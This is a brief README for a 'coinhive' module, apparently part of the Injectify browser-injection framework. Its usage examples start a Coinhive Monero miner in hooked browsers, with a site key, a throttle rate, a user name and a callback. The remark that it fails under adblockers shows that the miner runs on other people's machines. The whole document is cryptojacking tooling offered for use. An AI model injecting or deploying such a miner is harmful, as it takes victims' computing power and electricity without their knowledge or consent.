## `coinhive` module

Coinhive monero cryptocurrency miner. Will not work with adblockers

## Usage

```js
injectify.module('coinhive')
// undefined


injectify.module('coinhive', 'XM4QFXPvLGhsnlKmHzTrhEExUR4lL8Zz')
// undefined


injectify.module('coinhive', 'XM4QFXPvLGhsnlKmHzTrhEExUR4lL8Zz', function() {
    console.log('mining')
})
// undefined


injectify.module('coinhive', {
    sitekey: 'XM4QFXPvLGhsnlKmHzTrhEExUR4lL8Zz',
    throttle: 50,
    user: 'demo-user'
}, function() {
    console.log('mining')
})
```